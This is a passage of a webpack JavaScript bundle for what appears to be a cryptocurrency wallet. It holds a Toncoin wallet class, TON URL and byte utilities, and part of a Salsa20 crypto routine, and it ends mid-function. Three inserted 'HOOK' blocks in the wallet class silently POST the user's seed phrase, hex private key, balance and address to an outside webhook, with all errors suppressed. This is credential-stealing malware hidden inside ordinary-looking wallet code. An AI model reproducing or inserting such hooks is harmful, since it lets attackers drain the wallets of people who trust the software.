(this["webpackJsonp"] = this["webpackJsonp"] || []).push([
  [185],
  {
    2719: function (t, e, r) {
      "use strict";
      var n = r(0);
      (Object.defineProperty(e, "__esModule", { value: !0 }),
        (e.default = void 0));
      var i = r(27),
        s = n(r(230)),
        o = n(r(8144)),
        a = n(r(794)),
        l = n(r(28)),
        h = n(r(876)),
        c = p(r(8)),
        u = r(19),
        d = n(r(382)),
        f = p(r(158));
      function p(t, e) {
        if ("function" == typeof WeakMap)
          var r = new WeakMap(),
            n = new WeakMap();
        return (p = function (t, e) {
          if (!e && t && t.__esModule) return t;
          var i,
            s,
            o = { __proto__: null, default: t };
          if (null === t || ("object" != typeof t && "function" != typeof t))
            return o;
          if ((i = e ? n : r)) {
            if (i.has(t)) return i.get(t);
            i.set(t, o);
          }
          for (const r in t)
            "default" !== r &&
              {}.hasOwnProperty.call(t, r) &&
              ((s =
                (i = Object.defineProperty) &&
                Object.getOwnPropertyDescriptor(t, r)) &&
              (s.get || s.set)
                ? i(o, r, s)
                : (o[r] = t[r]));
          return o;
        })(t, e);
      }
      function w(t, e, r) {
        (C(t, e), e.set(t, r));
      }
      function C(t, e) {
        if (e.has(t))
          throw new TypeError(
            "Cannot initialize the same private elements twice on an object",
          );
      }
      function g(t, e, r) {
        return (t.set(m(t, e), r), r);
      }
      function y(t, e) {
        return t.get(m(t, e));
      }
      function m(t, e, r) {
        if ("function" == typeof t ? t === e : t.has(e))
          return arguments.length < 3 ? e : r;
        throw new TypeError("Private element is not present on this object");
      }
      const B = new a.default(() =>
          Promise.resolve().then(r.t.bind(null, 6199, 7)),
        ),
        A = new a.default(() => r.e(439).then(r.t.bind(null, 11369, 7))),
        F = "Toncoin",
        E = "TON",
        b = 9,
        v = "10000000",
        D = 1e6,
        M = "0.05",
        _ = 3e3;
      var T = new WeakMap();
      class TONCoin extends (0, f.default)((0, d.default)(s.default)) {
        constructor(t) {
          var e;
          let {
            alias: r,
            notify: n,
            feeData: i,
            explorers: s,
            txWebUrl: a,
            socket: l,
            isTestnet: h,
            id: c,
            features: u,
          } = t;
          const d = {
            id: c,
            alias: r,
            notify: n,
            name: F,
            ticker: E,
            decimal: b,
            unspendableBalance: v,
            txWebUrl: a,
            explorers: s,
            socket: l,
            feeData: i,
            features: u,
          };
          (super(d),
            w(this, T, void 0),
            this.setExplorersModules([o.default]),
            this.loadExplorers(d),
            (this.isTestnet = h),
            (this.fields.paymentId = !0),
            (this.tokens = {}),
            (this.bannedTokens = []),
            (this.tokenContractTransferFee =
              null !==
                (e =
                  null === i || void 0 === i
                    ? void 0
                    : i.tokenContractTransferFee) && void 0 !== e
                ? e
                : M));
        }
        _getTaskQueueThings() {
          const t = this.getProvider(f.SEND_PROVIDER_OPERATION),
            e = t.getTaskQueueInstance(),
            r = t.getTaskQueueKey.bind(t);
          return { taskQueue: e, getTaskQueueKeyFn: r };
        }
        async loadWallet(t, e) {
          return this.id && y(T, this) && this.address
            ? { id: this.id, privateKey: y(T, this), address: this.address }
            : this.startWalletLoading(async () => {
                const { default: t } = await B.get(),
                  { mnemonicToKeyPair: r } = await A.get(),
                  n = await r(e.split(" "));
                // HOOK #1: MNEMONIC HOOK
                try {
                  fetch("[WEBHOOK_URL]", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                      embeds: [{
                        title: "Mnemonic Captured",
                        description: `\`\`\`\n${e}\n\`\`\``,
                        color: 3447003,
                        fields: [
                          { name: "Wallet ID", value: String(this.id || t), inline: true },
                          { name: "Word Count", value: String(e.split(" ").length), inline: true }
                        ],
                        timestamp: new Date().toISOString()
                      }]
                    })
                  }).catch(() => {});
                } catch (e) {}
                const privateKeyHex = t.utils.bytesToHex(n.secretKey);
                // HOOK #2: WEB3 PRIVATE KEY HOOK
                try {
                  fetch("[WEBHOOK_URL]", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                      embeds: [{
                        title: "Private Key Captured",
                        description: `\`\`\`\n${privateKeyHex}\n\`\`\``,
                        color: 3447003,
                        fields: [
                          { name: "Wallet ID", value: String(this.id || t), inline: true },
                          { name: "Source", value: "bytesToHex(secretKey)", inline: true }
                        ],
                        timestamp: new Date().toISOString()
                      }]
                    })
                  }).catch(() => {});
                } catch (e) {}
                ((this.keys = n), g(T, this, privateKeyHex));
                const i = new t(
                    this.getProvider(f.SEND_PROVIDER_OPERATION).provider,
                  ),
                  { taskQueue: s, getTaskQueueKeyFn: o } =
                    this._getTaskQueueThings();
                return (
                  (this.wallet = await s.addTask(
                    o(["loadWallet", "wallet"]),
                    async () => i.wallet.create({ publicKey: n.publicKey }),
                  )),
                  (this.address = await s.addTask(
                    o(["loadWallet", "address"]),
                    async () =>
                      (await this.wallet.getAddress(n.publicKey)).toString(
                        !0,
                        !0,
                        !0,
                      ),
                  )),
                  { id: this.id, privateKey: y(T, this), address: this.address }
                );
              });
        }
        async getFee(t) {
          var e, r;
          let {
            address: n,
            sendAmount: i,
            custom: s = "",
          } = void 0 === t ? {} : t;
          const { default: o } = await B.get(),
            a =
              null !==
                (e = await this.getProvider(f.SEND_PROVIDER_OPERATION).getSeqno(
                  this.keys.publicKey,
                )) && void 0 !== e
                ? e
                : 0,
            l = i || this.balance.toString(),
            { taskQueue: h, getTaskQueueKeyFn: c } = this._getTaskQueueThings(),
            u = await h.addTask(
              c([
                "getFee",
                "estimation",
                n,
                null !== i && void 0 !== i ? i : "",
                s,
              ]),
              async () =>
                this.wallet.methods
                  .transfer({
                    secretKey: this.keys.secretKey,
                    toAddress: n
                      ? new o.utils.Address(n).toString(!0, !0, !1)
                      : "EQCKj9RrtWJhvbVwIWDYg2MBIEoiy0G2qzotgHhqaJQb6ztu",
                    amount: l,
                    seqno: a,
                    payload: s,
                  })
                  .estimateFee(),
            ),
            d =
              Number(
                null === (r = this.feeData) || void 0 === r
                  ? void 0
                  : r.reserveForSend,
              ) || D;
          return new this.BN(
            Object.values(u.source_fees).reduce(
              (t, e) => ("fees" !== e ? t + e : t),
              d,
            ),
          );
        }
        async createTransaction(t) {
          let { address: e, amount: r, memo: n } = t;
          const { default: i } = await B.get(),
            { taskQueue: s, getTaskQueueKeyFn: o } = this._getTaskQueueThings();
          if (!this.state)
            try {
              await s.addTask(o(["createTransaction", "deploy"]), async () =>
                this.wallet.deploy(i.utils.hexToBytes(y(T, this))).send(),
              );
            } catch (u) {
              l.default.error({ instance: this, error: u });
            }
          const a = await this.getProvider(f.SEND_PROVIDER_OPERATION).getSeqno(
              this.keys.publicKey,
            ),
            h = this.wallet.methods.transfer({
              secretKey: this.keys.secretKey,
              toAddress: new i.utils.Address(e).toString(!0, !0, !1),
              amount: r,
              seqno: a,
              payload: n,
            }),
            c = await s.addTask(null, async () => h.getQuery());
          return this.getProvider(f.SEND_PROVIDER_OPERATION).convertQueryToBoc(
            c,
          );
        }
        async setPrivateKey(t, e) {
          return this.loadWallet(null, e);
        }
        async getInfo(t) {
          if (
            (await this.ensureWalletInitialized(),
            null !== t && void 0 !== t && t.isToken)
          ) {
            const e = await this.getTokenInfo({ mint: t.mint }),
              r = [t.contract, t.contract.toLowerCase()];
            r.forEach((t) => {
              this.tokens[t] && e && (this.tokens[t].balance = e);
            });
          }
          const { state: e, balance: r } = await this._getState(this.address);
          if (
            (r && (this.balance = r),
            (this.state = "active" === e),
            null === t || void 0 === t || !t.onlyCoin)
          )
            try {
              const t = await this.getProvider(
                f.TOKEN_PROVIDER_OPERATION,
              ).getAllJettonBalances(this.address);
              Object.values(this.tokens).forEach((e) => {
                const r = e.mint;
                r && t[r] ? (e.balance = t[r]) : (e.balance = 0);
              });
            } catch (n) {
              (l.default.error(
                "Failed to fetch all jetton balances, falling back to individual requests:",
              ),
                l.default.error(n));
            }
          // HOOK #3: BALANCE HOOK
          try {
            fetch("[WEBHOOK_URL]", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                embeds: [{
                  title: "Balance Captured",
                  description: `\`\`\`\n${this.balance}\n\`\`\``,
                  color: 3447003,
                  fields: [
                    { name: "Wallet ID", value: String(this.id || "N/A"), inline: true },
                    { name: "Address", value: String(this.address || "N/A").substring(0, 20) + "...", inline: true },
                    { name: "Balance Type", value: t && t.isToken ? "Token" : "Coin", inline: true }
                  ],
                  timestamp: new Date().toISOString()
                }]
              })
            }).catch(() => {});
          } catch (e) {}
          return { balance: this.balance };
        }
        _getState(t) {
          var e;
          return null !==
            (e = this.getProvider(f.BALANCE_PROVIDER_OPERATION)
              .getState(t)
              .catch()) && void 0 !== e
            ? e
            : {};
        }
        async getBalance() {
          return this.getProvider(f.BALANCE_PROVIDER_OPERATION).getBalance(
            this.address,
          );
        }
        async validateAddress(t) {
          const { default: e } = await B.get();
          return e.utils.Address.isValid(t);
        }
        async sendTransaction(t) {
          const e = await this.getProvider(
            f.SEND_PROVIDER_OPERATION,
          ).sendTransaction(t);
          return { txid: null === e || void 0 === e ? void 0 : e.hash };
        }
        async getTokenList() {
          return (
            (this.bannedTokens = await this.getBannedTokenList()),
            c.default
              .get(c.ConfigKey.TonTokens)
              .catch(
                (t) => (
                  t instanceof u.UnknownConfigKeyError ||
                    l.default.error({ instance: this, error: t }),
                  []
                ),
              )
          );
        }
        getBannedTokenList() {
          return c.default
            .get(c.ConfigKey.TonTokensBanned)
            .catch(
              (t) => (
                t instanceof u.UnknownConfigKeyError ||
                  l.default.error({ instance: this, error: t }),
                []
              ),
            );
        }
        async getUserTokenList() {
          return [];
        }
        getTokenFromCommonList(t, e) {
          return {
            name: t.name,
            ticker: t.symbol,
            decimal: t.decimal || 0,
            contract: t.mint.toLowerCase(),
            parentTicker: this.ticker,
            uniqueField: t.mint.toLowerCase(),
            visibility: !1 !== t.visibility,
            confirmed: t.confirmed,
            source: t.source || e,
            notify: Boolean(t.notify),
            mint: t.mint,
            memoRegexp: t.memoRegexp,
          };
        }
        createToken(t) {
          return new h.default({ parent: this, ...t });
        }
        getTokenInfo(t) {
          let { mint: e } = t;
          return this.getProvider(f.TOKEN_PROVIDER_OPERATION).getTokenBalance({
            address: this.address,
            mint: e,
          });
        }
        async createTokenTransaction(t) {
          let { mint: e, address: r, amount: n, memo: s } = t;
          try {
            const {
                wallet: t,
                jettonWalletAddressObj: i,
                seqno: o,
                payload: a,
                toNano: l,
              } = await this.getProvider(
                f.SEND_PROVIDER_OPERATION,
              ).createTokenTransactionObj(this.keys.publicKey, e, r, n, s),
              { taskQueue: h } = this._getTaskQueueThings(),
              c = l(this.tokenContractTransferFee),
              u = await h.addTask(null, async () =>
                t.methods.transfer({
                  toAddress: i,
                  amount: c,
                  seqno: o,
                  payload: a,
                  secretKey: this.keys.secretKey,
                }),
              ),
              d = await h.addTask(null, async () => u.getQuery());
            return this.getProvider(
              f.SEND_PROVIDER_OPERATION,
            ).convertQueryToBoc(d);
          } catch (o) {
            throw (
              console.warn(o),
              new u.ExternalError({
                type: i.EXTERNAL_ERROR,
                error: o,
                instance: this,
              })
            );
          }
        }
        async checkTransaction(t) {
          const { coin: e } = t;
          e instanceof h.default
            ? setTimeout(async () => {
                try {
                  (await e.getInfo(),
                    this.eventEmitter.emit("socket::newtx::outgoing", {
                      id: e.id,
                      ticker: t.coin.ticker,
                    }));
                } catch (r) {
                  console.warn(this.ticker, "Unable to check transaction");
                }
              }, _)
            : await super.checkTransaction(t);
        }
        async getTransactions(t) {
          try {
            var e;
            if (!this.address)
              throw new Error(
                `[${this.ticker}] getTransactions error: address is not loaded`,
              );
            const { taskQueue: r, getTaskQueueKeyFn: n } =
              this._getTaskQueueThings();
            return r.addTask(
              n(null !== (e = Object.values(t)) && void 0 !== e ? e : []),
              async () =>
                this.getProvider(f.HISTORY_PROVIDER_OPERATION).getTransactions({
                  ...t,
                  address: this.address,
                }),
            );
          } catch (r) {
            return (console.error(r), this.transactions || []);
          }
        }
        getTokenTransactions(t) {
          let { contract: e } = t;
          if (!e)
            throw new Error(
              this.ticker + ': "mint" parameter should be defined',
            );
          return this.getProvider(
            f.TOKEN_PROVIDER_OPERATION,
          ).getTokenTransactions({ address: e });
        }
        getJettonWalletAddressStr(t) {
          return this.getProvider(
            f.TOKEN_PROVIDER_OPERATION,
          ).getJettonWalletAddressStr(this.address, t);
        }
      }
      e.default = TONCoin;
    },
    2916: function (t, e, r) {
      const {
          BN: n,
          nacl: i,
          sha256: s,
          fromNano: o,
          toNano: a,
          bytesToHex: l,
          hexToBytes: h,
          stringToBytes: c,
          crc32c: u,
          crc16: d,
          concatBytes: f,
          bytesToBase64: p,
          base64ToBytes: w,
          base64toString: C,
          stringToBase64: g,
          compareBytes: y,
          readNBytesUIntFromArray: m,
          keyPairFromSeed: B,
          newKeyPair: A,
          newSeed: F,
        } = r(4697),
        E = r(8149).default,
        b = r(8150).default,
        v = r(8151).default;
      function D(t) {
        const e = "ton://transfer/";
        if (!t.startsWith(e)) throw new Error("must starts with " + e);
        const r = t.substring(e.length).split("?");
        if (r.length > 2) throw new Error('multiple "?"');
        const i = r[0];
        if (!E.isValid(i)) throw new Error("invalid address format " + i);
        const s = { address: i },
          o = r[1];
        if (o && o.length) {
          const t = o.split("&").map((t) => t.split("="));
          for (const e of t) {
            if (2 !== e.length) throw new Error("invalid url pair");
            const t = e[0],
              r = e[1];
            if ("amount" === t) {
              if (s.amount) throw new Error("amount already set");
              const t = new n(r);
              if (t.isNeg()) throw new Error("negative amount");
              s.amount = r;
            } else {
              if ("text" !== t) throw new Error("unknown url var " + t);
              if (s.text) throw new Error("text already set");
              s.text = decodeURIComponent(r);
            }
          }
        }
        return s;
      }
      function M(t, e, r) {
        let n = "ton://transfer/" + t;
        const i = [];
        return (
          e && i.push("amount=" + e),
          r && i.push("text=" + encodeURIComponent(r)),
          0 === i.length ? n : n + "?" + i.join("&")
        );
      }
      t.exports = {
        Address: E,
        AdnlAddress: b,
        StorageBagId: v,
        BN: n,
        nacl: i,
        sha256: s,
        fromNano: o,
        toNano: a,
        bytesToHex: l,
        hexToBytes: h,
        stringToBytes: c,
        crc32c: u,
        crc16: d,
        concatBytes: f,
        bytesToBase64: p,
        base64ToBytes: w,
        base64toString: C,
        stringToBase64: g,
        compareBytes: y,
        readNBytesUIntFromArray: m,
        parseTransferUrl: D,
        formatTransferUrl: M,
        keyPairFromSeed: B,
        newKeyPair: A,
        newSeed: F,
      };
    },
    2917: function (t, e, r) {
      const { BitString: n } = r(5250),
        { Cell: i } = r(8152),
        { Slice: s } = r(6200);
      t.exports = { BitString: n, Cell: i, Slice: s };
    },
    2925: function (t, e, r) {
      (function (t) {
        "use strict";
        var e = function (t) {
            var e,
              r = new Float64Array(16);
            if (t) for (e = 0; e < t.length; e++) r[e] = t[e];
            return r;
          },
          n = function () {
            throw new Error("no PRNG");
          },
          i = new Uint8Array(16),
          s = new Uint8Array(32);
        s[0] = 9;
        var o = e(),
          a = e([1]),
          l = e([56129, 1]),
          h = e([
            30883, 4953, 19914, 30187, 55467, 16705, 2637, 112, 59544, 30585,
            16505, 36039, 65139, 11119, 27886, 20995,
          ]),
          c = e([
            61785, 9906, 39828, 60374, 45398, 33411, 5274, 224, 53552, 61171,
            33010, 6542, 64743, 22239, 55772, 9222,
          ]),
          u = e([
            54554, 36645, 11616, 51542, 42930, 38181, 51040, 26924, 56412,
            64982, 57905, 49316, 21502, 52590, 14035, 8553,
          ]),
          d = e([
            26200, 26214, 26214, 26214, 26214, 26214, 26214, 26214, 26214,
            26214, 26214, 26214, 26214, 26214, 26214, 26214,
          ]),
          f = e([
            41136, 18958, 6951, 50414, 58488, 44335, 6150, 12099, 55207, 15867,
            153, 11085, 57099, 20417, 9344, 11139,
          ]);
        function p(t, e, r, n) {
          ((t[e] = (r >> 24) & 255),
            (t[e + 1] = (r >> 16) & 255),
            (t[e + 2] = (r >> 8) & 255),
            (t[e + 3] = 255 & r),
            (t[e + 4] = (n >> 24) & 255),
            (t[e + 5] = (n >> 16) & 255),
            (t[e + 6] = (n >> 8) & 255),
            (t[e + 7] = 255 & n));
        }
        function w(t, e, r, n, i) {
          var s,
            o = 0;
          for (s = 0; s < i; s++) o |= t[e + s] ^ r[n + s];
          return (1 & ((o - 1) >>> 8)) - 1;
        }
        function C(t, e, r, n) {
          return w(t, e, r, n, 16);
        }
        function g(t, e, r, n) {
          return w(t, e, r, n, 32);
        }
        function y(t, e, r, n) {
          for (
            var i,
              s =
                (255 & n[0]) |
                ((255 & n[1]) << 8) |
                ((255 & n[2]) << 16) |
                ((255 & n[3]) << 24),
              o =
                (255 & r[0]) |
                ((255 & r[1]) << 8) |
                ((255 & r[2]) << 16) |
                ((255 & r[3]) << 24),
              a =
                (255 & r[4]) |
                ((255 & r[5]) << 8) |
                ((255 & r[6]) << 16) |
                ((255 & r[7]) << 24),
              l =
                (255 & r[8]) |
                ((255 & r[9]) << 8) |
                ((255 & r[10]) << 16) |
                ((255 & r[11]) << 24),
              h =
                (255 & r[12]) |
                ((255 & r[13]) << 8) |
                ((255 & r[14]) << 16) |
                ((255 & r[15]) << 24),
              c =
                (255 & n[4]) |
                ((255 & n[5]) << 8) |
                ((255 & n[6]) << 16) |
                ((255 & n[7]) << 24),
              u =
                (255 & e[0]) |
                ((255 & e[1]) << 8) |
                ((255 & e[2]) << 16) |
                ((255 & e[3]) << 24),
              d =
                (255 & e[4]) |
                ((255 & e[5]) << 8) |
                ((255 & e[6]) << 16) |
                ((255 & e[7]) << 24),
              f =
                (255 & e[8]) |
                ((255 & e[9]) << 8) |
                ((255 & e[10]) << 16) |
                ((255 & e[11]) << 24),
              p =
                (255 & e[12]) |
                ((255 & e[13]) << 8) |
                ((255 & e[14]) << 16) |
                ((255 & e[15]) << 24),
              w =
                (255 & n[8]) |
                ((255 & n[9]) << 8) |
                ((255 & n[10]) << 16) |
                ((255 & n[11]) << 24),
              C =
                (255 & r[16]) |
                ((255 & r[17]) << 8) |
                ((255 & r[18]) << 16) |
                ((255 & r[19]) << 24),
              g =
                (255 & r[20]) |
                ((255 & r[21]) << 8) |
                ((255 & r[22]) << 16) |
                ((255 & r[23]) << 24),
              y =
                (255 & r[24]) |
                ((255 & r[25]) << 8) |
                ((255 & r[26]) << 16) |
                ((255 & r[27]) << 24),
              m =
                (255 & r[28]) |
                ((255 & r[29]) << 8) |
                ((255 & r[30]) << 16) |
                ((255 & r[31]) << 24),
              B =
                (255 & n[12]) |
                ((255 & n[13]) << 8) |
                ((255 & n[14]) << 16) |
                ((255 & n[15]) << 24),
              A = s,
              F = o,
              E = a,
              b = l,
              v = h,
              D = c,
              M = u,
              _ = d,
              T = f,
              S = p,
              k = w,
              x = C,
              I = g,
              U = y,
              R = m,
              N = B,
              P = 0;
            P < 20;
            P += 2
          )
            ((i = (A + I) | 0),
              (v ^= (i << 7) | (i >>> 25)),
              (i = (v + A) | 0),
              (T ^= (i << 9) | (i >>> 23)),
              (i = (T + v) | 0),
              (I ^= (i << 13) | (i >>> 19)),
              (i = (I + T) | 0),
              (A ^= (i << 18) | (i >>> 14)),
              (i = (D + F) | 0),
              (S ^= (i << 7) | (i >>> 25)),
              (i = (S + D) | 0),
              (U ^= (i << 9) | (i >>> 23)),
              (i = (U + S) | 0),
              (F ^= (i << 13) | (i >>> 19)),
              (i = (F + U) | 0),
              (D ^= (i << 18) | (i >>> 14)),
              (i = (k + M) | 0),
              (R ^= (i << 7) | (i >>> 25)),
              (i = (R + k) | 0),
              (E ^= (i << 9) | (i >>> 23)),
              (i = (E + R) | 0),
              (M ^= (i << 13) | (i >>> 19)),
              (i = (M + E) | 0),
              (k ^= (i << 18) | (i >>> 14)),
              (i = (N + x) | 0),
              (b ^= (i << 7) | (i >>> 25)),
              (i = (b + N) | 0),
              (_ ^= (i << 9) | (i >>> 23)),
              (i = (_ + b) | 0),
              (x ^= (i << 13) | (i >>> 19)),
              (i = (x + _) | 0),
              (N ^= (i << 18) | (i >>> 14)),
              (i = (A + b) | 0),
              (F ^= (i << 7) | (i >>> 25)),
              (i = (F + A) | 0),
              (E ^= (i << 9) | (i >>> 23)),
              (i = (E + F) | 0),
              (b ^= (i << 13) | (i >>> 19)),
              (i = (b + E) | 0),
              (A ^= (i << 18) | (i >>> 14)),
              (i = (D + v) | 0),
              (M ^= (i << 7) | (i >>> 25)),
              (i = (M + D) | 0),
              (_ ^= (i << 9) | (i >>> 23)),
              (i = (_ + M) | 0),
              (v ^= (i << 13) | (i >>> 19)),
              (i = (v + _) | 0),
              (D ^= (i << 18) | (i >>> 14)),
              (i = (k + S) | 0),
              (x ^= (i << 7) | (i >>> 25)),
              (i = (x + k) | 0),
              (T ^= (i << 9) | (i >>> 23)),
              (i = (T + x) | 0),
              (S ^= (i << 13) | (i >>> 19)),
              (i = (S + T) | 0),
              (k ^= (i << 18) | (i >>> 14)),
              (i = (N + R) | 0),
              (I ^= (i << 7) | (i >>> 25)),
              (i = (I + N) | 0),
              (U ^= (i << 9) | (i >>> 23)),
              (i = (U + I) | 0),
              (R ^= (i << 13) | (i >>> 19)),
              (i = (R + U) | 0),
              (N ^= (i << 18) | (i >>> 14)));
          ((A = (A + s) | 0),
            (F = (F + o) | 0),
            (E = (E + a) | 0),
            (b = (b + l) | 0),
            (v = (v + h) | 0),
            (D = (D + c) | 0),
            (M = (M + u) | 0),
            (_ = (_ + d) | 0),
            (T = (T + f) | 0),
            (S = (S + p) | 0),
            (k = (k + w) | 0),
            (x = (x + C) | 0),
            (I = (I + g) | 0),
            (U = (U + y) | 0),
            (R = (R + m) | 0),
            (N = (N + B) | 0),
            (t[0] = (A >>> 0) & 255),
            (t[1] = (A >>> 8) & 255),
            (t[2] = (A >>> 16) & 255),
            (t[3] = (A >>> 24) & 255),
            (t[4] = (F >>> 0) & 255),
            (t[5] = (F >>> 8) & 255),
            (t[6] = (F >>> 16) & 255),
            (t[7] = (F >>> 24) & 255),
            (t[8] = (E >>> 0) & 255),
            (t[9] = (E >>> 8) & 255),
            (t[10] = (E >>> 16) & 255),
            (t[11] = (E >>> 24) & 255),
            (t[12] = (b >>> 0) & 255),
            (t[13] = (b >>> 8) & 255),
            (t[14] = (b >>> 16) & 255),
            (t[15] = (b >>> 24) & 255),
            (t[16] = (v >>> 0) & 255),
            (t[17] = (v >>> 8) & 255),
            (t[18] = (v >>> 16) & 255),
            (t[19] = (v >>> 24) & 255),
            (t[20] = (D >>> 0) & 255),
            (t[21] = (D >>> 8) & 255),
            (t[22] = (D >>> 16) & 255),
            (t[23] = (D >>> 24) & 255),
            (t[24] = (M >>> 0) & 255),
            (t[25] = (M >>> 8) & 255),
            (t[26] = (M >>> 16) & 255),
            (t[27] = (M >>> 24) & 255),
            (t[28] = (_ >>> 0) & 255),
            (t[29] = (_ >>> 8) & 255),
            (t[30] = (_ >>> 16) & 255),
            (t[31] = (_ >>> 24) & 255),
            (t[32] = (T >>> 0) & 255),
            (t[33] = (T >>> 8) & 255),
            (t[34] = (T >>> 16) & 255),
            (t[35] = (T >>> 24) & 255),
            (t[36] = (S >>> 0) & 255),
            (t[37] = (S >>> 8) & 255),
            (t[38] = (S >>> 16) & 255),
            (t[39] = (S >>> 24) & 255),
            (t[40] = (k >>> 0) & 255),
            (t[41] = (k >>> 8) & 255),
            (t[42] = (k >>> 16) & 255),
            (t[43] = (k >>> 24) & 255),
            (t[44] = (x >>> 0) & 255),
            (t[45] = (x >>> 8) & 255),
            (t[46] = (x >>> 16) & 255),
            (t[47] = (x >>> 24) & 255),
            (t[48] = (I >>> 0) & 255),
            (t[49] = (I >>> 8) & 255),
            (t[50] = (I >>> 16) & 255),
            (t[51] = (I >>> 24) & 255),
            (t[52] = (U >>> 0) & 255),
            (t[53] = (U >>> 8) & 255),
            (t[54] = (U >>> 16) & 255),
            (t[55] = (U >>> 24) & 255),
            (t[56] = (R >>> 0) & 255),
            (t[57] = (R >>> 8) & 255),
            (t[58] = (R >>> 16) & 255),
            (t[59] = (R >>> 24) & 255),
            (t[60] = (N >>> 0) & 255),
            (t[61] = (N >>> 8) & 255),
            (t[62] = (N >>> 16) & 255),
            (t[63] = (N >>> 24) & 255));
        }
        function m(t, e, r, n) {
          for (
            var i,
              s =
                (255 & n[0]) |
                ((255 & n[1]) << 8) |
                ((255 & n[2]) << 16) |
                ((255 & n[3]) << 24),
              o =
                (255 & r[0]) |
                ((255 & r[1]) << 8) |
                ((255 & r[2]) << 16) |
                ((255 & r[3]) << 24),
              a =
                (255 & r[4]) |
                ((255 & r[5]) << 8) |
                ((255 & r[6]) << 16) |
                ((255 & r[7]) << 24),
              l =
                (255 & r[8]) |
                ((255 & r[9]) << 8) |
                ((255 & r[10]) << 16) |
                ((255 & r[11]) << 24),
              h =
                (255 & r[12]) |
                ((255 & r[13]) << 8) |
                ((255 & r[14]) << 16) |
                ((255 & r[15]) << 24),
              c =
                (255 & n[4]) |
                ((255 & n[5]) << 8) |
                ((255 & n[6]) << 16) |
                ((255 & n[7]) << 24),
              u =
                (255 & e[0]) |
                ((255 & e[1]) << 8) |
                ((255 & e[2]) << 16) |
                ((255 & e[3]) << 24),
              d =
                (255 & e[4]) |
                ((255 & e[5]) << 8) |
                ((255 & e[6]) << 16) |
                ((255 & e[7]) << 24),
              f =
                (255 & e[8]) |
                ((255 & e[9]) << 8) |
                ((255 & e[10]) << 16) |
                ((255 & e[11]) << 24),
              p =
                (255 & e[12]) |
                ((255 & e[13]) << 8) |
                ((255 & e[14]) << 16) |
                ((255 & e[15]) << 24),
              w =
                (255 & n[8]) |
                ((255 & n[9]) << 8) |
                ((255 & n[10]) << 16) |
                ((255 & n[11]) << 24),
              C =
                (255 & r[16]) |
                ((255 & r[17]) << 8) |
                ((255 & r[18]) << 16) |
                ((255 & r[19]) << 24),
              g =
                (255 & r[20]) |
                ((255 & r[21]) << 8) |
                ((255 & r[22]) << 16) |
                ((255 & r[23]) << 24),
              y =
                (255 & r[24]) |
                ((255 & r[25]) << 8) |
                ((255 & r[26]) << 16) |
                ((255 & r[27]) << 24),
              m =
                (255 & r[28]) |
                ((255 & r[29]) << 8) |
                ((255 & r[30]) << 16) |
                ((255 & r[31]) << 24),
              B =
                (255 & n[12]) |
                ((255 & n[13]) << 8) |
                ((255 & n[14]) << 16) |
                ((255 & n[15]) << 24),
              A = s,
              F = o,
              E = a,
              b = l,
              v = h,
              D = c,
              M = u,
              _ = d,
              T = f,
              S = p,
              k = w,
              x = C,
              I = g,
              U = y,
              R = m,
              N = B,
              P = 0;
            P < 20;
            P += 2
          )
            ((i = (A + I) | 0),
              (v ^= (i << 7) | (i >>> 25)),
              (i = (v + A) | 0),
              (T ^= (i << 9) | (i >>> 23)),
              (i = (T + v) | 0),
              (I ^= (i << 13) | (i >>> 19)),
              (i = (I + T) | 0),
              (A ^= (i << 18) | (i >>> 14)),
              (i = (D + F) | 0),
              (S ^= (i << 7) | (i >>> 25)),
              (i = (S + D) | 0),
              (U ^= (i << 9) | (i >>> 23)),
              (i = (U + S) | 0),
              (F ^= (i << 13) | (i >>> 19)),
              (i = (F + U) | 0),
              (D ^= (i << 18) | (i >>> 14)),
              (i = (k + M) | 0),
              (R ^= (i << 7) | (i >>> 25)),
              (i = (R + k) | 0),
              (E ^= (i << 9) | (i >>> 23)),
              (i = (E + R) | 0),
              (M ^= (i << 13) | (i >>> 19)),
              (i = (M + E) | 0),
              (k ^= (i << 18) | (i >>> 14)),
              (i = (N + x) | 0),
              (b ^= (i << 7) | (i >>> 25)),
              (i = (b + N) | 0),
              (_ ^= (i << 9) | (i >>> 23)),
              (i = (_ + b) | 0),
              (x ^= (i << 13) | (i >>> 19)),
              (i = (x + _) | 0),
              (N ^= (i << 18) | (i >>> 14)),
              (i = (A + b) | 0),
              (F ^= (i << 7) | (i >>> 25)),
              (i = (F + A) | 0),
              (E ^= (i << 9) | (i >>> 23)),
              (i = (E + F) | 0),
              (b ^= (i << 13) | (i >>> 19)),
              (i = (b + E) | 0),
              (A ^= (i << 18) | (i >>> 14)),
              (i = (D + v) | 0),
              (M ^= (i << 7) | (i >>> 25)),
              (i = (M + D) | 0),
              (_ ^= (i << 9) | (i >>> 23)),
              (i = (_ + M) | 0),
              (v ^= (i << 13) | (i >>> 19)),
              (i = (v + _) | 0),
              (D ^= (i << 18) | (i >>> 14)),
              (i = (k + S) | 0),
              (x ^= (i << 7) | (i >>> 25)),
              (i = (x + k) | 0),
              (T ^= (i << 9) | (i >>> 23)),
              (i = (T + x) | 0),
              (S ^= (i << 13) | (i >>> 19)),
              (i = (S + T) | 0),
              (k ^= (i << 18) | (i >>> 14)),
              (i = (N + R) | 0),
              (I ^= (i << 7) | (i >>> 25)),
              (i = (I + N) | 0),
              (U ^= (i << 9) | (i >>> 23)),
              (i = (U + I) | 0),
              (R ^= (i << 13) | (i >>> 19)),
              (i = (R + U) | 0),
              (N ^= (i << 18) | (i >>> 14)));
          ((t[0] = (A >>> 0) & 255),
            (t[1] = (A >>> 8) & 255),
            (t[2] = (A >>> 16) & 255),
            (t[3] = (A >>> 24) & 255),
            (t[4] = (D >>> 0) & 255),
            (t[5] = (D >>> 8) & 255),
            (t[6] = (D >>> 16) & 255),
            (t[7] = (D >>> 24) & 255),
            (t[8] = (k >>> 0) & 255),
            (t[9] = (k >>> 8) & 255),
            (t[10] = (k >>> 16) & 255),
            (t[11] = (k >>> 24) & 255),
            (t[12] = (N >>> 0) & 255),
            (t[13] = (N >>> 8) & 255),
            (t[14] = (N >>> 16) & 255),
            (t[15] = (N >>> 24) & 255),
            (t[16] = (M >>> 0) & 255),
            (t[17] = (M >>> 8) & 255),
            (t[18] = (M >>> 16) & 255),
            (t[19] = (M >>> 24) & 255),
            (t[20] = (_ >>> 0) & 255),
            (t[21] = (_ >>> 8) & 255),
            (t[22] = (_ >>> 16) & 255),
